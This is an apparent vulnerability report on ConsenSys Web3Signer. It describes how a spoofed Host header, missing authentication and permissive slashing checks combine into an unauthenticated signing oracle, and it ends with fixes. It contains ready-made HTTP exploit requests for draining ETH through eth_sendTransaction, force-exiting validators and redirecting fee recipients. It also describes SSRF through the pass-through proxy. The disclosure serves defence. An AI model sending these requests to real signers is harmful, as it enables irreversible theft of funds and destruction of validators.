# Web3Signer: Signing Oracle via Three Chained Gaps — Total Asset Compromise

**Target:** ConsenSys Web3Signer (HEAD `d8ea31d`)

---

## What This Is

Three gaps in the codebase chain together to give any network-reachable attacker an **unrestricted signing oracle** — functionally identical to stealing every private key the signer holds. The attacker can sign anything, with any key, unlimited times, with no credential.

This is not about one endpoint or one missing check. It's about how three individually-incomplete weaknesses combine to give the attacker the **signing function itself**, and what that function controls.

---

## The Three Gaps

### Gap 1: Host Header Is the Only Gate, and It's Client-Controlled

`HostAllowListHandler.java:50-52`:
```java
private Optional<String> getAndValidateHostHeader(final RoutingContext event) {
    final HostAndPort hostAndPort = event.request().authority();   // reads HTTP "Host:" header
    return Optional.ofNullable(hostAndPort).map(HostAndPort::host);
}
```

This reads `event.request().authority()` — the HTTP `Host` header — which is a value the **client** sets. It never calls `event.request().remoteAddress()`. The default allowlist is `["localhost","127.0.0.1"]` (`Web3SignerBaseCommand.java:142`). Any client from any IP sets `Host: localhost` and passes.

### Gap 2: Nothing After the Gate

`Runner.java:128-155` — the Vert.x router chain is:

```
AccessLog -> CorsHandler -> HostAllowListHandler -> BodyHandler -> [route handlers]
```

No `AuthHandler`. No `BearerAuthHandler`. No JWT validation. No API key check. The OpenAPI spec at `openapi-specs/eth2/keymanager/schemas.yaml:2-6` declares `bearerAuth: JWT` — **no code implements it**. After the Host header passes, every request reaches the handler with full trust.

### Gap 3: Slashing Protection Is Scoped Wrong

`Eth2SignForIdentifierHandler.java:169-200`:
```java
private boolean maySign(...) {
    switch (eth2SigningRequestBody.type()) {
      case BLOCK, BLOCK_V2 -> { /* DB check */ }
      case ATTESTATION     -> { /* DB check */ }
      default -> { return true; }          // 10 of 13 types pass unconditionally
    }
}
```

Slashing protection guards against protocol-level slashing (double blocks, surround votes). It treats everything else as "safe to sign." But `VOLUNTARY_EXIT` is irreversible. `VALIDATOR_REGISTRATION` controls where money goes. `DEPOSIT` controls withdrawal credentials. None of these are "slashable," but all are destructive. The design conflates "not slashable" with "safe."

---

## What the Signing Oracle Means — Concretely

Gaps 1+2+3 give the attacker a function: **sign(key, data) -> signature**, for any key loaded in Web3Signer, with any data, unlimited times.

This is not theoretical. Here is what that function controls in each deployment mode:

---

### Eth1 Mode: Immediate, Complete Fund Theft

In Eth1 mode, Web3Signer acts as a signing proxy in front of a Besu node. It handles `eth_sendTransaction` — which **signs AND broadcasts** the transaction to the network in a single call.

**Code path:**

```
JsonRpcRoute.java:94-100
  -> route(POST, "/")
  -> JsonRpcHandler
      -> RequestMapper.java dispatch
          -> "eth_sendTransaction" -> SendTransactionHandler.java:58

SendTransactionHandler.java:58-86
  :62 -> transactionFactory.createTransaction(context, request)
          -> Transaction object: from=VICTIM, to=ATTACKER, value=ALL_ETH
  :78 -> secpSigner.isSignerAvailable(victim_address) -> true (key is loaded)
  :85 -> sendTransaction(transaction, context, secpSigner, request)

  -> TransactionSerializer.java:43-51
      :98-102 -> secpSigner.sign(victim_address, bytesToSign) -> Secp256k1 signature
                 (SignerForIdentifier.java:42 -> real private key signs)

  -> TransactionTransmitter.java:58-71
      :59 -> createSignedTransactionPayload() -> RLP-encoded signed transaction
      :66 -> sendTransaction(Json.encode(request))

  -> TransactionTransmitter.java:112-117
      :116 -> transmitter.sendRequest(method, headers, path, bodyContent)
               -> VertxRequestTransmitter forwards to downstream Besu node
               -> Besu broadcasts to Ethereum network
               -> Transaction is mined
               -> Funds are transferred
```

**Attacker sends:**
```http
POST / HTTP/1.1
Host: localhost
Content-Type: application/json

{"jsonrpc":"2.0","method":"eth_sendTransaction",
 "params":[{"from":"0xVICTIM_ADDRESS","to":"0xATTACKER_ADDRESS",
            "value":"0xDE0B6B3A7640000"}],"id":1}
```

**What happens on-chain:** The signed transaction is broadcast. The ETH moves from victim to attacker. It is mined into a block. The transfer is final.

The attacker doesn't even need to know the victim's balance first — they call `eth_accounts` (also unauthenticated, `JsonRpcRoute.java:131-135`) to enumerate all loaded addresses, then drain each one. Web3Signer helpfully auto-fills the nonce via `RetryingTransactionTransmitter` (line 110-115) which retries with incremented nonces up to 10 times if nonce is too low.

**Additionally** — `PassThroughHandler` (`JsonRpcRoute.java:103-107`) forwards **every unrecognized JSON-RPC method** to the internal Besu node:

```java
// JsonRpcRoute.java:103-107
context.getRouter().route()
    .handler(BodyHandler.create())
    .handler(new PassThroughHandler(transmitterFactory, JSON_DECODER));
```

```java
// PassThroughHandler.java:56-62
final VertxRequestTransmitter transmitter =
    transmitterFactory.create(new ForwardedMessageResponder(context));
transmitter.sendRequest(request.method(), headersToSend, request.path(),
    context.body().asString());   // forwards ANYTHING to Besu
```

This gives the attacker an open SSRF proxy to the internal Besu node — `admin_peers`, `debug_traceTransaction`, `txpool_content`, `miner_setEtherbase` — whatever the downstream node exposes. APIs that are never meant to be externally reachable become externally reachable through Web3Signer.

**Eth1 bottom line:** The attacker drains every account, immediately, irreversibly. Plus full proxy access to the internal Besu node.

---

### Eth2 Mode: Permanent Validator Destruction + Revenue Theft

#### Attack A: Force-Exit Every Validator (Irreversible On-Chain)

```
POST /api/v1/eth2/sign/0x<PUBKEY> HTTP/1.1
Host: localhost

{"type":"VOLUNTARY_EXIT",
 "fork_info":{"fork":{"previous_version":"0x04000000",
   "current_version":"0x05000000","epoch":"269568"},
   "genesis_validators_root":"0x4b363db94e..."},
 "voluntary_exit":{"epoch":"269568","validator_index":"12345"}}
```

All inputs are public blockchain data. Code path through `Eth2SignForIdentifierHandler.java`:
- `:94` — parse body, type = `VOLUNTARY_EXIT`
- `:100` -> `computeSigningRoot()` -> `:271-274` — compute root from epoch + validator_index + fork
- `:133-134` — `signerForIdentifier.sign()` — **BLS signature produced with real private key**
- `:150` -> `maySign()` -> `:196-197` — `default -> return true` — **no check**
- `:152` — `respondWithSignature()` — **signature returned to attacker**

Attacker broadcasts `SignedVoluntaryExit` to any beacon node. The beacon chain verifies the BLS signature (valid — signed by the real key). The validator enters the exit queue. After 256 epochs (~27 hours), it is **permanently removed from the active set**. There is no on-chain mechanism to cancel a voluntary exit. Ever. The staked 32 ETH is locked until the withdrawal epoch.

For N validators: N x 32 ETH of staked capital becomes illiquid. All future consensus rewards are permanently forfeited. The operator must re-deposit with entirely new keys and wait through the activation queue (weeks to months).

#### Attack B: Redirect All Revenue (Stealth, Ongoing)

```
POST /api/v1/eth2/sign/0x<PUBKEY> HTTP/1.1
Host: localhost

{"type":"VALIDATOR_REGISTRATION",
 "validator_registration":{"fee_recipient":"0xATTACKER_ADDRESS",
   "gas_limit":"30000000","timestamp":"1707436800",
   "pubkey":"0x<SAME_PUBKEY>"}}
```

Same code path. `VALIDATOR_REGISTRATION` -> `computeSigningRoot()` at `:316-320` (doesn't even need fork_info). Signs. `maySign()` -> `default -> return true`. Signature returned.

Attacker submits signed registration to MEV relays. Relays verify signature against on-chain pubkey (valid). All future blocks built by relays for this validator send priority fees + MEV to `0xATTACKER`. The operator sees nothing wrong — the validator keeps attesting and proposing normally. Money silently flows to the attacker until someone manually audits fee recipient registrations across all relays.

#### Attack C: Deny Consensus Participation (Ongoing Penalties)

The attacker can **race** the legitimate beacon node's signing requests. If the attacker signs a block at slot X before the beacon node does, slashing protection records the attacker's version. When the legitimate beacon node requests a signature for its block at slot X, `maySignBlock()` returns false (slot already signed). The validator misses its proposal. Repeat for attestations (sign a valid attestation at each epoch before the beacon node does). The validator incurs inactivity penalties and loses ETH through missed duties, even without being exited.

---

## Combined Impact — This Is Total Compromise

The signing oracle is **functionally identical to possessing all private keys**. The distinction between "signing access" and "key theft" doesn't matter when:

- There is no rate limit (sign unlimited times)
- There is no type restriction (sign anything — transactions, exits, registrations, blocks, deposits)
- There is no revocation mechanism (the oracle works as long as the process runs)
- There is no audit alerting (signing operations log at TRACE/DEBUG only)

| Mode | What Happens | Is It Reversible? |
|------|-------------|-------------------|
| **Eth1** | Every ETH balance drained from every loaded Secp256k1 account via `eth_sendTransaction` | **No.** Transactions are final once mined. |
| **Eth1** | Full SSRF proxy to internal Besu node (admin/debug/txpool APIs) | Depends on downstream exposure. |
| **Eth2** | Every validator permanently force-exited via `VOLUNTARY_EXIT` | **No.** Exits are irreversible on-chain. |
| **Eth2** | All MEV + priority fee revenue redirected via `VALIDATOR_REGISTRATION` | Revenue lost during theft window is gone. |
| **Eth2** | Legitimate proposals/attestations blocked by racing, causing inactivity leak | Stops when attacker stops, but penalties already incurred. |

For a staking operation with 1,000 validators and associated Eth1 accounts: every account is drained, every validator is permanently exited, and all MEV revenue is redirected — simultaneously, in minutes, with no credentials.

---

## Exact Code Path (Eth1 — Direct Fund Theft)

```
HTTP POST / {"jsonrpc":"2.0","method":"eth_sendTransaction","params":[...]}
|
+- Runner.java:143 -- HostAllowListHandler
|   +- :36-37 -- Host="localhost" -> allowlist match -> event.next()
|       (NO remoteAddress check. NO auth layer follows.)
|
+- JsonRpcRoute.java:94-100 -- route(POST, "/")
|   +- JsonRpcHandler -> RequestMapper -> "eth_sendTransaction"
|       +- SendTransactionHandler.java:58 -- handle()
|           |
|           +- :62 -- transactionFactory.createTransaction()
|           |         from = 0xVICTIM, to = 0xATTACKER, value = all ETH
|           |
|           +- :78 -- secpSigner.isSignerAvailable(victim) -> true
|           |
|           +- :85 -- sendTransaction()
|               |
|               +- TransactionSerializer.java:98-102
|               |   +- secpSigner.sign(victim_address, txBytes)
|               |       +- SignerForIdentifier.java:42
|               |           +- signerProvider.getSigner(victim)
|               |               +- EthSecpArtifactSigner.sign(data) <<< REAL PRIVATE KEY SIGNS
|               |
|               +- TransactionTransmitter.java:112-117
|                   +- transmitter.sendRequest(POST, headers, "/", signedTxJson)
|                       +- VertxRequestTransmitter.java:70-79
|                           +- downStreamConnection.request(POST, "/")
|                               +- request.end(signedTxBody)
|                                   +- Besu receives eth_sendRawTransaction
|                                       +- Transaction broadcast to Ethereum p2p network
|                                           +- Mined into block
|                                               +- ETH transferred to attacker <<< DONE
```

---

## What Breaks the Chain

Any one of these kills it:

1. **Authentication** — Bearer token, mTLS, or API key validation in the router chain before any handler. Cost: one middleware addition in `Runner.java`. The attacker is stopped before reaching any route. This is the minimal fix and it kills the chain for both Eth1 and Eth2 modes.

2. **Source IP validation** — Replace `event.request().authority()` with `event.request().remoteAddress()` in `HostAllowListHandler`. The attacker can no longer bypass the allowlist by spoofing a header.

3. **Default-deny in maySign()** — Change `default -> return true` to `default -> return false`. At minimum, add explicit deny for `VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION`. This only helps Eth2 mode; Eth1 has no equivalent concept — there is nothing between the signing function and fund transfer.

The minimal fix is #1. Currently all three gaps co-exist, and the path from TCP connect to total asset drainage is unbroken.
